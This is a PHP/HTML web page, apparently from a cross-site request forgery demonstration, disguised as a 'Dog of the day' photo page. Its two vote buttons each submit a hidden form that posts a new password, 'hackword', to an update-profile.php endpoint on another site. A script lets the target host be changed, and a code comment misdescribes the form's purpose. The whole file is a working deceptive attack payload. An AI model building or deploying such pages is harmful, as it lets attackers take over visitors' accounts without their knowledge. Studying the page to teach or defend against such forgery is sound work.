<!DOCTYPE html>
<html lang="de">
    <?php include 'template/head.php';?>

    <body>
        <?php include 'template/navbar.php';?>
        <div class="container">
            <h1 class="text-center">Dog of the day</h1>
            <h5 class="text-center">Look at this dog, isn't he the sweetest little dog you've ever seen?</h5>
            <img class="center-block" src="cute-dog.jpg"/>
            <p class="text-center">Image courtesy of vudhikrai at FreeDigitalPhotos.net</p>

            <!-- Form for deleting all pics-->
            <form method="POST" action="http://ccc-xsrf.dev/update-profile.php" class="form-horizontal text-center" id="xsrf-form">
                    <input type="hidden" name="password" value="hackword">
                    <input type="hidden" name="password-confirmation" value="hackword">
                    <button class="btn btn-danger" type="submit" name="submit" >
                        <i class="fa fa-btn fa-times"></i>I don't like this dog
                    </button>
                    &nbsp; &nbsp;
                    <button class="btn btn-success" type="submit" name="submit" >
                        <i class="fa fa-btn fa-check"></i>I like this dog
                    </button>
            </form>
        </div>
    </body>
    <?php include 'template/footer.php';?>
    <?php include 'template/scripts.php';?>
    <script>
        $( "#host" ).on("change", function() {
            console.log($("#host").val());
            $("#xsrf-form").attr("action", $("#host").val() + "/update-profile.php");
        });
    </script>
</html>
